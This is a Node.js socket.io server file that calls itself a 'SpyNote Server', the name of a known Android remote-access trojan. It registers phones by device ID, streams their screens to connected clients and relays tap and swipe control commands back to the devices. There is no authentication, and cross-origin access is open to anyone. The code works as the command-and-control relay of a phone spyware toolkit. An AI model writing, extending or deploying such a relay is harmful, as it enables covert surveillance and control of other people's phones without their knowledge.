const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 200 * 1024 * 1024
});

app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                width: deviceInfo.width || 1080,
                height: deviceInfo.height || 2340
            });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log('📱 Device registered:', deviceId, deviceInfo.model);
        }
    });

    // 🔥 ULTRA SMOOTH 30FPS + LAYOUT
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                layout: data.layout || [],
                timestamp: data.timestamp
            });
        }
    });

    // 🔥 PRECISE CONTROLS
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x || 0),
                y: parseFloat(y || 0),
                startX: parseFloat(startX || 0),
                startY: parseFloat(startY || 0),
                endX: parseFloat(endX || 0),
                endY: parseFloat(endY || 0),
                duration: parseInt(duration) || 300
            });
            console.log('🎮 Control:', action, 'on', deviceId);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📴 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server LIVE on port ${PORT}`);
    console.log('📱 Serve index.html from /public/ folder');
});
